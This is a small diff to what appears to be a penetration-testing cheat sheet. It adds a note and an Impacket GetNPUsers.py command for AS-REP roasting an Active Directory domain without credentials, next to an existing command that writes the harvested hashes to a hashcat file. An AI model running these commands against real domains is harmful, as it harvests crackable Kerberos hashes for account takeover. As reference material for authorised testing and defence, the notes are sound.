@@ -9,3 +9,9 @@ With a list of known users:
 ```bash
 GetNPUsers.py -usersfile users.txt -dc-ip x.x.x.x domain.local/ -outputfile asrep.hashcat
 ```
+
+This might work from with no credentials:
+
+```bash
+GetNPUsers.py domain.local/ -dc-ip x.x.x.x
+```
